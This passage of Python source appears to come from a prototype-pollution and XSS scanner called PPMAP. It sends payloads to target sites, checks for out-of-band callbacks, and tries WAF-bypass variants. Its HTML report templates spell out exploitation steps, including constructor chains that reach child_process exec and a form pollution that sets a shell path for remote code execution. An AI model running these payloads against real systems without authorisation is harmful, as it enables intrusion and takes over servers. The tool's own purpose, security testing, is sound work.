                payload_str = raw_payload.replace("%OOB%", oob_domain)

                try:
                    # Try parsing as JSON first
                    payload_json = json.loads(payload_str)

                    # Send Payload (POST JSON)
                    self.session.post(
                        target_url,
                        json=payload_json,
                        timeout=self.timeout,
                        verify=self.session.verify,
                    )
                except:
                    pass

            print(f"{Colors.BLUE}[*] Waiting for OOB interactions...{Colors.ENDC}")
            time.sleep(2)  # Wait for DNS propagation/callback
            interactions = self.oob_detector.poll()
            if interactions:
                for i in interactions:
                    findings.append(
                        {
                            "type": "blind_server_side_pp_oob",
                            "method": "INTERACTSH_CALLBACK",
                            "severity": "CRITICAL",
                            "description": f"Received OOB interaction from {i.get('remote-address')} via {i.get('protocol')}",
                            "payload": f"OOB Domain: {oob_domain}",
                            "verified": True,
                            "impact": "Confirmed Remote Code Execution (RCE) or SSRF capability",
                        }
                    )
                    print(
                        f"{Colors.FAIL}[!] CRITICAL: OOB Interaction received! Blind PP Confirmed.{Colors.ENDC}"
                    )
        except Exception as e:
            print(f"{Colors.WARNING}[⚠] OOB test error: {e}{Colors.ENDC}")

        return findings

    def scan_target(self, target_url, request_data=None):
        """Scan single target"""
        all_findings = []

        # New Feature: Strict Liveness Check
        if not self.check_target_status(target_url):
            return []

        print_section(f"FULL SCAN MODE - Target: {target_url}")

        if not self.setup_browser(target_url):
            return []

        # Reset and start metrics for this target
        self.metrics = ScanMetrics(start_time=time.time())

        # Fingerprint Frameworks
        if detect_frameworks is not None:
            print(
                f"{Colors.BLUE}[*] Detecting frameworks and technologies...{Colors.ENDC}"
            )
            try:
                # Get initial response (using session to share cookies)
                resp = self.session.get(
                    target_url, verify=self.session.verify, timeout=self.timeout
                )
                self.metrics.total_requests += 1

                detected = detect_frameworks(resp.text, resp.headers)
                summary = fingerprint_summary(detected)
                print(summary)

                # Prioritize payloads
                priority = get_priority_payloads(detected)
                if priority:
                    print(
                        f"{Colors.GREEN}[+] Prioritizing payload categories: {', '.join(priority)}{Colors.ENDC}"
                    )

                self.metrics.frameworks_detected = [d["framework"] for d in detected]
            except Exception as e:
                print(f"{Colors.WARNING}[!] Fingerprinting failed: {e}{Colors.ENDC}")

        # -------------------------------------------------------------------------
        # ADVANCED VERSION DETECTION (JS-Based)
        # -------------------------------------------------------------------------
        # Detect exact jQuery version via browser execution (more reliable than static analysis)
        try:
            js_version = self.driver.execute_script(
                "return (window.jQuery && window.jQuery.fn && window.jQuery.fn.jquery) || (window.$ && window.$.fn && window.$.fn.jquery);"
            )
            if js_version:
                print(
                    f"{Colors.CYAN}[*] JS Execution confirmed: jQuery v{js_version}{Colors.ENDC}"
                )
                # Update/Override framework list with exact version
                found = False
                for d in detected:
                    if d["framework"] == "jquery":
                        d["confidence"] = 100
                        d["version"] = js_version
                        found = True
                        break
                if not found:
                    detected.append(
                        {
                            "framework": "jquery",
                            "confidence": 100,
                            "version": js_version,
                        }
                    )
                    # Re-prioritize since we found new framework
                    priority = get_priority_payloads(detected)
                    if priority:
                        print(
                            f"{Colors.GREEN}[+] Re-prioritize payloads: jQuery v{js_version} detected!{Colors.ENDC}"
                        )
        except Exception as e:
            logger.debug(f"Ignored error: {type(e).__name__} - {e}")

        all_findings = []
        try:
            jquery_findings = self.test_jquery_prototype_pollution()
            xss_findings = self.test_xss_with_details(target_url)
            post_findings = self.test_post_parameters(target_url)
            server_pp_findings = self.test_server_side_prototype_pollution(
                target_url, request_data=request_data
            )
            dom_xss_pp_findings = self.test_dom_xss_with_pp(target_url)

            # v3.6 HASH-BASED PP (WAF BYPASS) - NEW
            hash_pp_findings = self.test_hash_based_pp(target_url)

            # v3.0 ADVANCED FEATURES - NEW TESTS
            waf_bypass_findings = self.test_with_waf_bypass(target_url)
            confidence_findings = self.test_with_confidence_scoring()
            endpoint_findings = self.discover_and_test_endpoints(target_url)

            # v3.1 TIER-1 ENHANCEMENTS - BLIND DETECTION & ADVANCED BYPASS (NEW)
            json_spaces_findings = self.test_json_spaces_overflow(target_url)
            status_override_findings = self.test_status_code_override(target_url)
            function_proto_findings = self.test_function_prototype_chain(target_url)
            persistence_findings = self.test_persistence_verification(target_url)
            
            # v5.0 PHASE 9 - SOTA FUZZING
            deep_chain_findings = self.test_deep_chain_pollution(target_url)
            http_header_findings = self.test_http_header_pollution(target_url)

            # v3.2 TIER-2 ENHANCEMENTS - MODERN FRAMEWORKS (React 19, SvelteKit)
            react_flight_findings = self.test_react_flight_protocol(target_url)
            sveltekit_findings = self.test_sveltekit_superforms(target_url)
            charset_findings = self.test_charset_override(target_url)

            # v3.3 TIER-3 ENHANCEMENTS - PORTSWIGGER TECHNIQUES
            fetch_findings = self.test_fetch_api_pollution(target_url)
            defineproperty_findings = self.test_object_defineproperty_bypass(target_url)
            child_process_findings = self.test_child_process_rce(target_url)

            # v3.4 TIER-4 ENHANCEMENTS - ADVANCED BYPASS TECHNIQUES (2024/2025 Research)
            constructor_findings = self.test_constructor_pollution(target_url)
            sanitization_findings = self.test_sanitization_bypass(target_url)
            descriptor_pollution_findings = self.test_descriptor_pollution(target_url)
            blind_gadget_findings = self.test_blind_gadgets(
                target_url, request_data=request_data
            )

            # v3.5 PHASE 1 - RESEARCH GAP FEATURES (refrensi.md)
            cors_findings = self.test_cors_header_pollution(target_url)
            third_party_gadget_findings = self.test_third_party_gadgets(target_url)
            storage_api_findings = self.test_storage_api_pollution(target_url)

            # v3.5 PHASE 2 & 3 - CVE-SPECIFIC & REAL-WORLD EXPLOITS
            cve_findings = self.test_cve_specific_payloads(target_url)
            kibana_findings = self.test_kibana_telemetry_rce(target_url)
            blitzjs_findings = self.test_blitzjs_rce_chain(target_url)
            elastic_xss_findings = self.test_elastic_xss(target_url)

            # v4.0 OOB & BLIND DETECTION (NEW)
            oob_findings = []
            if self.oob_enabled:
                oob_findings = self.test_blind_oob(target_url)

            # None-safe aggregation (prevent "can only concatenate list (not NoneType)" error)
            all_findings = (
                (jquery_findings or [])
                + (xss_findings or [])
                + (post_findings or [])
                + (server_pp_findings or [])
                + (dom_xss_pp_findings or [])
                + (waf_bypass_findings or [])
                + (hash_pp_findings or [])
                + (confidence_findings or [])
                + (endpoint_findings or [])
                + (json_spaces_findings or [])
                + (status_override_findings or [])
                + (function_proto_findings or [])
                + (persistence_findings or [])
                + (deep_chain_findings or [])
                + (http_header_findings or [])
                + (react_flight_findings or [])
                + (sveltekit_findings or [])
                + (charset_findings or [])
                + (fetch_findings or [])
                + (defineproperty_findings or [])
                + (child_process_findings or [])
                + (constructor_findings or [])
                + (sanitization_findings or [])
                + (descriptor_pollution_findings or [])
                + (blind_gadget_findings or [])
                + (cors_findings or [])
                + (third_party_gadget_findings or [])
                + (storage_api_findings or [])
                + (cve_findings or [])
                + (kibana_findings or [])
                + (cve_findings or [])
                + (kibana_findings or [])
                + (blitzjs_findings or [])
                + (elastic_xss_findings or [])
                + (oob_findings or [])
            )
            total = len(all_findings)

            total = len(all_findings)

            # Update metrics
            self.metrics.end_time = time.time()
            self.metrics.vulnerabilities_found = total

            print(
                f"\n{Colors.BOLD}{Colors.GREEN}Scan Complete! Vulnerabilities Found: {total}{Colors.ENDC}"
            )
            print(
                f"{Colors.BLUE}[*] Scan Duration: {self.metrics.duration:.2f}s | Success Rate: {self.metrics.success_rate:.1f}%{Colors.ENDC}"
            )

            if total > 0:
                print(
                    f"\n{Colors.WARNING}jQuery PP: {len(jquery_findings)} | XSS: {len(xss_findings)} | POST XSS: {len(post_findings)} | Server-Side PP: {len(server_pp_findings)} | DOM XSS+PP: {len(dom_xss_pp_findings)} | Hash PP: {len(hash_pp_findings)} | WAF Bypass: {len(waf_bypass_findings)}{Colors.ENDC}"
                )
                print(
                    f"{Colors.CYAN}Confidence Scored: {len(confidence_findings)} | Endpoints Tested: {len(endpoint_findings)}{Colors.ENDC}"
                )
                print(
                    f"{Colors.CYAN}Tier 1 - Blind Detection: JSON Spaces={len(json_spaces_findings)} | Status Override={len(status_override_findings)} | Function.proto={len(function_proto_findings)} | Persistence={len(persistence_findings)}{Colors.ENDC}"
                )
                print(
                    f"{Colors.CYAN}Tier 2 - Modern Frameworks: React Flight={len(react_flight_findings)} | SvelteKit={len(sveltekit_findings)} | Charset={len(charset_findings)}{Colors.ENDC}"
                )
                print(
                    f"{Colors.CYAN}Tier 3 - PortSwigger Techniques: fetch()={len(fetch_findings)} | defineProperty={len(defineproperty_findings)} | child_process RCE={len(child_process_findings)}{Colors.ENDC}"
                )
                print(
                    f"{Colors.CYAN}Tier 4 - Advanced Bypass (2024/2025): Constructor={len(constructor_findings)} | Sanitization Bypass={len(sanitization_findings)} | Descriptor PP={len(descriptor_pollution_findings)} | Gadget Fuzzing={len(blind_gadget_findings)}{Colors.ENDC}"
                )

                # Legacy reporting disabled - handled by main()
                # self.save_reports(target_url, all_findings, jquery_findings, xss_findings, dom_xss_pp_findings)
            else:
                print(f"{Colors.GREEN}[✓] No vulnerabilities detected.{Colors.ENDC}")
                # self.save_reports(target_url, [], [], [], [])
        except Exception as e:
            print(f"{Colors.FAIL}[!] Scan error: {str(e)}{Colors.ENDC}")
        finally:
            if self.driver:
                self.driver.close()

        return all_findings

    def save_reports(
        self,
        target_url,
        all_findings,
        jquery_findings,
        xss_findings,
        dom_xss_pp_findings=None,
    ):
        """Generate and save HTML/JSON reports in target-specific folder"""
        if dom_xss_pp_findings is None:
            dom_xss_pp_findings = []
        try:
            # Extract domain from URL for folder name
            parsed_url = urllib.parse.urlparse(target_url)
            domain = parsed_url.netloc.replace(".", "_").replace(":", "_")

            # Create target-specific folder: report/domain_timestamp/
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            target_folder = os.path.join("report", f"{domain}_{timestamp}")

            if not os.path.exists(target_folder):
                os.makedirs(target_folder)

            # Save JSON report
            json_file = os.path.join(target_folder, "report.json")
            json_data = {
                "scan_date": datetime.now().isoformat(),
                "target": target_url,
                "total_vulnerabilities": len(all_findings),
                "jquery_pp_count": len(jquery_findings),
                "xss_count": len(xss_findings),
                "findings": all_findings,
            }

            with open(json_file, "w") as f:
                json.dump(json_data, f, indent=2)

            print(f"{Colors.GREEN}[✓] JSON Report saved: {json_file}{Colors.ENDC}")

            # Save HTML report
            html_file = os.path.join(target_folder, "report.html")
            html_content = self.generate_html_report(
                target_url,
                all_findings,
                jquery_findings,
                xss_findings,
                dom_xss_pp_findings,
            )
            with open(html_file, "w") as f:
                f.write(html_content)

            print(f"{Colors.GREEN}[✓] HTML Report saved: {html_file}{Colors.ENDC}")
            print(f"{Colors.GREEN}[✓] Reports folder: {target_folder}{Colors.ENDC}")

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] Failed to save reports: {str(e)}{Colors.ENDC}")

    def generate_html_report(
        self,
        target_url,
        all_findings,
        jquery_findings,
        xss_findings,
        dom_xss_pp_findings=None,
    ):
        """Generate detailed HTML report with all findings including WAF bypasses and endpoints"""
        if dom_xss_pp_findings is None:
            dom_xss_pp_findings = []
        # Categorize findings
        waf_bypasses = [f for f in all_findings if f.get("type") == "waf_bypass"]
        discovered_endpoints = [
            f for f in all_findings if f.get("type") == "discovered_endpoint"
        ]
        blind_pp_findings = [
            f
            for f in all_findings
            if f.get("type")
            in [
                "blind_pp_detected",
                "persistent_pp",
                "status_override_detected",
                "function_prototype_pollution",
                "persistent_prototype_pollution",
            ]
        ]
        react_flight_findings = [
            f for f in all_findings if f.get("type") == "react_flight_vulnerability"
        ]
        sveltekit_findings = [
            f
            for f in all_findings
            if f.get("type")
            in ["sveltekit_superforms_pollution", "sveltekit_url_pollution"]
        ]
        charset_findings = [
            f for f in all_findings if f.get("type") == "charset_override_detected"
        ]

        report_html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>PPMAP v3.7 - Security Report</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%); color: #fff; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .header h1 {{ margin: 0; font-size: 28px; }}
        .header p {{ margin: 8px 0; font-size: 14px; opacity: 0.9; }}
        .section {{ background: white; margin: 20px 0; padding: 25px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }}
        .section h2 {{ margin-top: 0; color: #1a1a1a; border-bottom: 3px solid #f44; padding-bottom: 10px; }}
        .section h3 {{ color: #333; margin-top: 20px; margin-bottom: 15px; }}
        .vulnerability {{ background: #fee; border-left: 5px solid #f44; padding: 15px; margin: 12px 0; border-radius: 4px; }}
        .waf_bypass {{ background: #fff3e0; border-left: 5px solid #ff9800; padding: 15px; margin: 12px 0; border-radius: 4px; }}
        .endpoint {{ background: #e3f2fd; border-left: 5px solid #2196f3; padding: 15px; margin: 12px 0; border-radius: 4px; }}
        .success {{ background: #d4edda; border-left: 5px solid #28a745; padding: 15px; margin: 10px 0; border-radius: 4px; }}
        .stats {{ display: flex; gap: 15px; margin: 20px 0; flex-wrap: wrap; }}
        .stat {{ background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%); padding: 18px; border-radius: 8px; flex: 1; min-width: 150px; text-align: center; border: 1px solid #dee2e6; }}
        .stat-label {{ font-size: 12px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; }}
        .stat-number {{ font-size: 36px; font-weight: bold; color: #f44; margin: 10px 0; }}
        code {{ background: #f5f5f5; padding: 3px 8px; border-radius: 3px; font-family: 'Courier New', monospace; font-size: 13px; word-break: break-all; }}
        .payload-code {{ background: #1a1a1a; color: #00ff00; padding: 12px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 12px; overflow-x: auto; border: 1px solid #444; }}
        .table-container {{ overflow-x: auto; }}
        table {{ width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 14px; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background: #f8f9fa; font-weight: 600; color: #333; }}
        tr:hover {{ background: #f9f9f9; }}
        .critical {{ color: #d32f2f; font-weight: bold; }}
        .high {{ color: #f57c00; font-weight: bold; }}
        .medium {{ color: #fbc02d; font-weight: bold; }}
        .info {{ color: #1976d2; font-weight: bold; }}
        a {{ color: #1976d2; text-decoration: none; word-break: break-all; }}
        a:hover {{ text-decoration: underline; }}
        .verification {{ background: #f5f5f5; border: 1px solid #ddd; padding: 12px; border-radius: 4px; font-family: monospace; font-size: 12px; margin: 10px 0; }}
        .verification-title {{ font-weight: bold; margin-bottom: 8px; color: #333; }}
        .method-label {{ display: inline-block; background: #e0e0e0; padding: 4px 8px; border-radius: 3px; font-size: 12px; margin-bottom: 8px; color: #333; }}
        ul {{ line-height: 1.8; }}
        footer {{ text-align: center; margin-top: 40px; padding: 20px; color: #999; border-top: 1px solid #ddd; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 PPMAP v3.7 - Security Assessment Report</h1>
            <p><strong>Target:</strong> {html_escape(target_url)}</p>
            <p><strong>Scan Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="section">
            <h2>📊 Summary</h2>
            <div class="stats">
                <div class="stat">
                    <div class="stat-label">Total Findings</div>
                    <div class="stat-number">{len(all_findings)}</div>
                </div>
                <div class="stat">
                    <div class="stat-label">WAF Bypasses</div>
                    <div class="stat-number">{len(waf_bypasses)}</div>
                </div>
                <div class="stat">
                    <div class="stat-label">Discovered Endpoints</div>
                    <div class="stat-number">{len(discovered_endpoints)}</div>
                </div>
                <div class="stat">
                    <div class="stat-label">Prototype Pollution</div>
                    <div class="stat-number">{len(jquery_findings)}</div>
                </div>
                <div class="stat">
                    <div class="stat-label">XSS</div>
                    <div class="stat-number">{len(xss_findings)}</div>
                </div>
                <div class="stat">
                    <div class="stat-label">DOM XSS + PP</div>
                    <div class="stat-number">{len(dom_xss_pp_findings)}</div>
                </div>
            </div>
        </div>
        
        <div class="section">
            <h2>⚠️ Detailed Findings</h2>
"""

        if len(all_findings) == 0:
            report_html += '<div class="success"><strong>✓ No security issues detected!</strong></div>'
        else:
            # DOM XSS + Prototype Pollution findings (highest priority)
            if dom_xss_pp_findings:
                report_html += f"<h3>🔴 DOM-Based XSS with Prototype Pollution (CRITICAL) ({len(dom_xss_pp_findings)} found)</h3>"
                for idx, finding in enumerate(dom_xss_pp_findings, 1):
                    key = finding.get("key", "Unknown")
                    payload = finding.get("payload", "")
                    severity = finding.get("severity", "CRITICAL")
                    verified = finding.get("verified", False)
                    alert_triggered = finding.get("alert_triggered", False)

                    report_html += f"""
            <div class="vulnerability">
                <div style="margin-bottom: 12px;">
                    <strong>#{idx} - DOM XSS via Prototype Pollution Property: {html_escape(key)}</strong>
                    <span class="method-label critical">{severity}</span>
                    {' [✓ VERIFIED - Alert Triggered]' if alert_triggered else (' [⚠ Reflected]' if finding.get('reflected') else '')}
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Vulnerable Property Key:</strong><br>
                    <div class="payload-code">{html_escape(key)}</div>
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Payload:</strong><br>
                    <div class="payload-code">{html_escape(payload)}</div>
                </div>
                <div>
                    <strong>Manual Verification:</strong><br>
                    <div class="verification">
                        <div class="verification-title">Test URL:</div>
                        {html_escape(target_url)}?{html_escape(key)}={html_escape(payload)}<br><br>
                        <div class="verification-title">Using curl:</div>
                        <code>curl "{html_escape(target_url)}?{html_escape(key)}={html_escape(payload)}"</code><br><br>
                        <div class="verification-title">Expected Behavior:</div>
                        If vulnerable, the page will execute JavaScript code. For data: URLs with alert, you should see a JavaScript alert popup. For transport_url and similar properties, check if the payload is processed by the application logic.
                    </div>
                </div>
                <div style="margin-top: 15px;">
                    <strong>Why This Is Critical:</strong><br>
                    <div class="verification">
                        Prototype Pollution combined with DOM-based XSS allows an attacker to:<br>
                        1. Pollute the Object prototype with malicious properties<br>
                        2. Inject XSS payloads through those properties<br>
                        3. Execute arbitrary JavaScript in the victim's browser<br>
                        4. Steal session cookies, perform CSRF attacks, deface the site, etc.
                    </div>
                </div>
            </div>
"""

            # WAF Bypass Techniques - ALWAYS DISPLAY (fixed condition)
            if waf_bypasses:
                report_html += (
                    f"<h3>🛡️ WAF Bypass Techniques ({len(waf_bypasses)} found)</h3>"
                )
                report_html += """
            <div style="background: #fff9e6; border-left: 5px solid #ff9800; padding: 15px; margin: 12px 0; border-radius: 4px;">
                <strong>ℹ️ How to Verify WAF Bypass:</strong>
                <div style="margin-top: 10px; font-size: 13px;">
                    <ol>
                        <li><strong>Test Each Variation:</strong> Copy the payload and paste it in the test URL</li>
                        <li><strong>Check Response Status:</strong> If server accepts it (status 200), WAF may be bypassed</li>
                        <li><strong>Look for Reflected Values:</strong> If payload appears in response, it may have passed the filter</li>
                        <li><strong>Test in Browser Console:</strong> Verify if Prototype Pollution actually occurred</li>
                        <li><strong>Monitor Response Headers:</strong> Check for custom headers that indicate pollution</li>
                    </ol>
                </div>
            </div>
"""
                for idx, finding in enumerate(waf_bypasses, 1):
                    method = finding.get("method", "Unknown")
                    payload = finding.get("payload", "")
                    severity = finding.get("severity", "HIGH")

                    report_html += f'''
            <div class="waf_bypass">
                <div style="margin-bottom: 12px;">
                    <strong>#{idx} - WAF Bypass via {html_escape(method)}</strong>
                    <span class="method-label">{severity}</span>
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Bypass Technique:</strong> {html_escape(method)}<br>
                    <strong>Description:</strong> This payload attempts to bypass WAF filters using {html_escape(method.lower())} techniques.
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Payload:</strong><br>
                    <div class="payload-code">{html_escape(payload)}</div>
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Manual Verification Steps:</strong><br>
                    <div class="verification">
                        <div class="verification-title">1. Test via Browser URL:</div>
                        Open in your browser: <code style="word-break: break-all;">{html_escape(target_url)}?{html_escape(payload)}</code><br><br>
                        
                        <div class="verification-title">2. Test via curl (Check HTTP Status):</div>
                        <code style="display: block; margin: 10px 0;">curl -v "{html_escape(target_url)}?{html_escape(payload.replace('"', '\\"'))}"</code>
                        Look for: Status 200 = Payload accepted, Status 403/400 = Blocked by WAF<br><br>
                        
                        <div class="verification-title">3. Check if Payload is Reflected:</div>
                        <code style="display: block; margin: 10px 0;">curl -s "{html_escape(target_url)}?{html_escape(payload.replace('"', '\\"'))}" | grep -i "__proto__"</code>
                        If you see the payload in response = Potentially vulnerable<br><br>
                        
                        <div class="verification-title">4. Browser Console Verification:</div>
                        <code style="display: block; margin: 10px 0;">let obj = {{}};
console.log(obj.polluted);  // Check if prototype was polluted</code><br><br>
                        
                        <div class="verification-title">Expected Behavior:</div>
                        ✓ HTTP status 200 (not 403/400)<br>
                        ✓ Payload appears in response<br>
                        ✓ Object.prototype shows new properties in console<br>
                        ✓ No WAF error page displayed
                    </div>
                </div>
            </div>
'''

            # Blind Prototype Pollution Detection (NEW v3.1)
            if blind_pp_findings:
                report_html += f"<h3>🔍 Blind Server-Side Prototype Pollution ({len(blind_pp_findings)} found)</h3>"
                report_html += """
            <div style="background: #ffe6e6; border-left: 5px solid #d32f2f; padding: 15px; margin: 12px 0; border-radius: 4px;">
                <strong>⚠️ CRITICAL: Blind Prototype Pollution Detected</strong>
                <div style="margin-top: 10px; font-size: 13px;">
                    <p><strong>What This Means:</strong> The server is vulnerable to prototype pollution that cannot be directly observed. The vulnerability was detected via side-channel techniques:</p>
                    <ul>
                        <li><strong>JSON Spaces Override:</strong> Response formatting changes indicate prototype modification</li>
                        <li><strong>Status Code Override:</strong> HTTP status codes change based on polluted properties</li>
                        <li><strong>Persistence:</strong> Pollution affects <strong>ALL USERS</strong> until server restart (CRITICAL)</li>
                        <li><strong>Function.prototype:</strong> Advanced constructor chains allow RCE gadgets</li>
                    </ul>
                    <p><strong>Risk Level:</strong> <span style="color: #d32f2f; font-weight: bold;">CRITICAL</span> - Can affect entire application and all users</p>
                </div>
            </div>
"""
                for idx, finding in enumerate(blind_pp_findings, 1):
                    method = finding.get("method", "Unknown")
                    severity = finding.get("severity", "HIGH")
                    description = finding.get(
                        "description", "Blind prototype pollution detected"
                    )
                    finding_type = finding.get("type", "unknown")

                    # Determine color based on severity
                    if severity == "CRITICAL" or "PERSISTENT" in description.upper():
                        color = "#d32f2f"
                    else:
                        color = "#f57c00"

                    report_html += f"""
            <div class="vulnerability" style="background: #fee; border-left: 5px solid {color};">
                <div style="margin-bottom: 12px;">
                    <strong>#{idx} - {html_escape(method)}</strong>
                    <span class="method-label" style="background-color: {color}; color: white;">{severity}</span>
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Type:</strong> {html_escape(finding_type.upper())}<br>
                    <strong>Description:</strong> {html_escape(description)}
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Technical Details:</strong><br>
                    <div class="verification">
"""
                    if finding_type == "blind_pp_detected":
                        report_html += """
                        <strong>Detection Method:</strong> JSON Spaces Overflow<br>
                        <p>The server's JSON response formatting changes when prototype is polluted. This is detected by:</p>
                        <ol>
                            <li>Baseline request: normal response size</li>
                            <li>Pollution request: {"__proto__": {"json spaces": 10}}</li>
                            <li>If response size increases by 30%+, prototype pollution succeeded</li>
                        </ol>
                        <p><strong>Remediation:</strong> Update Node.js/Express, validate all user input, use Object.freeze() for critical prototypes</p>
"""
                    elif finding_type == "status_override_detected":
                        status_code = finding.get("status_code", 418)
                        report_html += f"""
                        <strong>Detection Method:</strong> HTTP Status Code Override<br>
                        <p>The server returned HTTP {status_code} instead of normal error code. This indicates:</p>
                        <ol>
                            <li>Payload: {{"__proto__": {{"status": {status_code}}}}}</li>
                            <li>Server accepted the pollution and used it in response logic</li>
                            <li>Attacker can modify HTTP status codes for all users</li>
                        </ol>
                        <p><strong>Remediation:</strong> Sanitize all user input before merge operations, use lodash >= 4.17.11</p>
"""
                    elif finding_type == "function_prototype_pollution":
                        report_html += """
                        <strong>Detection Method:</strong> Function.prototype Chain Access<br>
                        <p>Advanced bypass detected via constructor.constructor.prototype. This is more dangerous because:</p>
                        <ol>
                            <li>Affects ALL functions in the application (not just objects)</li>
                            <li>Can be used for RCE via Function constructor</li>
                            <li>Bypasses basic __proto__ filters</li>
                        </ol>
                        <p><strong>Example RCE Chain:</strong> constructor.constructor("return process.mainModule.require('child_process').exec('command')")( )</p>
"""
                    elif finding_type == "persistent_prototype_pollution":
                        report_html += """
                        <strong>Detection Method:</strong> Cross-Request Persistence<br>
                        <p><strong style="color: #d32f2f;">CRITICAL:</strong> Pollution persists across requests. This means:</p>
                        <ol>
                            <li>One malicious request pollutes Object.prototype</li>
                            <li>ALL subsequent requests (from all users) are affected</li>
                            <li>Pollution remains until server restart</li>
                            <li>Single request = Global compromise</li>
                        </ol>
                        <p><strong style="color: #d32f2f;">Impact:</strong> Entire server is compromised. Every user becomes an admin.</p>
                        <p><strong>Immediate Action Required:</strong> Restart server, review logs for exploitation attempts</p>
"""

                    report_html += """
                    </div>
                </div>
            </div>
"""

            # Tier 2: React 19/Next.js Flight Protocol
            if react_flight_findings:
                report_html += f"<h3>⚛️ React 19/Next.js Flight Protocol (CRITICAL) ({len(react_flight_findings)} found)</h3>"
                report_html += """
            <div style="background: #ffebee; border-left: 5px solid #c62828; padding: 15px; margin: 12px 0; border-radius: 4px;">
                <strong>🚨 CRITICAL: React Flight Protocol Vulnerability</strong>
                <div style="margin-top: 10px; font-size: 13px;">
                    <p><strong>RESEARCH-2024-REACT-FLIGHT (React) / RESEARCH-2024-NEXTJS-FLIGHT (Next.js):</strong></p>
                    <ul>
                        <li>Deserialization flaw in Flight protocol (RSC payloads)</li>
                        <li>Allows constructor chain traversal without strict PP checks</li>
                        <li><strong>Impact:</strong> Unauthenticated Remote Code Execution (RCE)</li>
                        <li><strong>Affected:</strong> Next.js App Router, React 19 with Server Components</li>
                        <li><strong>Risk:</strong> ANY endpoint can be exploited (no Server Actions needed)</li>
                    </ul>
                </div>
            </div>
"""
                for idx, finding in enumerate(react_flight_findings, 1):
                    method = finding.get("method", "FLIGHT_UNKNOWN")
                    payload = finding.get("payload", "")
                    cve = finding.get("cve", "RESEARCH-2024-REACT-FLIGHT")

                    report_html += f"""
            <div class="vulnerability" style="background: #fee; border-left: 5px solid #c62828;">
                <div style="margin-bottom: 12px;">
                    <strong>#{idx} - {html_escape(method)}</strong>
                    <span class="method-label" style="background-color: #c62828; color: white;">CRITICAL</span>
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>CVE:</strong> {cve}<br>
                    <strong>Payload Pattern:</strong><br>
                    <div class="payload-code">{html_escape(payload)}</div>
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Exploitation Method:</strong><br>
                    <div class="verification">
                        <p><strong>1. Identify React Flight Endpoints:</strong></p>
                        <code>curl -H "X-React-Flight: true" https://target/_next/data</code>
                        <br><br>
                        <p><strong>2. Send Malicious Flight Payload:</strong></p>
                        <code>POST /api/endpoint HTTP/1.1<br>Content-Type: application/json<br><br>{{"_formData": {{"get": "$1:then:constructor:constructor"}}}}</code>
                        <br><br>
                        <p><strong>3. Execute RCE via Function Constructor:</strong></p>
                        <code>constructor("return require('child_process').execSync('whoami')")()</code>
                        <br><br>
                        <p><strong>Immediate Action:</strong> Update React to latest, enable strict deserialization checks</p>
                    </div>
                </div>
            </div>
"""

            # Tier 2: SvelteKit/Superforms
            if sveltekit_findings:
                report_html += f"<h3>🟠 SvelteKit/Superforms Vulnerability ({len(sveltekit_findings)} found)</h3>"
                report_html += """
            <div style="background: #fff3e0; border-left: 5px solid #e65100; padding: 15px; margin: 12px 0; border-radius: 4px;">
                <strong>⚠️ CRITICAL: SvelteKit/Superforms PP</strong>
                <div style="margin-top: 10px; font-size: 13px;">
                    <p><strong>RESEARCH-2024-SVELTEKIT-RCE:</strong> Prototype pollution via __superform_file___proto__ pattern</p>
                    <p><strong>RESEARCH-2024-DEVALUE:</strong> Devalue deserialization flaw</p>
                    <ul>
                        <li>Form processing allows PP via __superform_* keys</li>
                        <li>Can pollute nodemailer settings for RCE</li>
                        <li><strong>Impact:</strong> Remote Code Execution via email functions</li>
                        <li><strong>Attack:</strong> Pollute sendmail path → execute arbitrary commands</li>
                    </ul>
                </div>
            </div>
"""
                for idx, finding in enumerate(sveltekit_findings, 1):
                    method = finding.get("method", "SVELTEKIT_UNKNOWN")
                    payload = finding.get("payload", "")
                    cve = finding.get("cve", "RESEARCH-2024-SVELTEKIT-RCE")

                    report_html += f"""
            <div class="vulnerability" style="background: #fff3e0; border-left: 5px solid #e65100;">
                <div style="margin-bottom: 12px;">
                    <strong>#{idx} - {html_escape(method)}</strong>
                    <span class="method-label" style="background-color: #e65100; color: white;">CRITICAL</span>
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>CVE:</strong> {cve}<br>
                    <strong>Payload:</strong><br>
                    <div class="payload-code">{html_escape(payload)}</div>
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Exploitation:</strong><br>
                    <div class="verification">
                        <p><strong>Form Data Pollution:</strong></p>
                        <code>POST /form HTTP/1.1<br>__superform_files___proto__.path=/bin/bash<br>__superform_files___proto__.args=-c,whoami</code>
                        <br><br>
                        <p><strong>Nodemailer Gadget Chain:</strong></p>
                        <code>Pollution → sendmail path → child_process.spawn → RCE</code>
                        <br><br>
                        <p><strong>Mitigation:</strong> Update SvelteKit, disable superforms if not needed</p>
                    </div>
                </div>
            </div>
"""

            # Tier 2: Charset Override
            if charset_findings:
                report_html += f"<h3>🔤 Charset Override & Encoding Bypass ({len(charset_findings)} found)</h3>"
                report_html += """
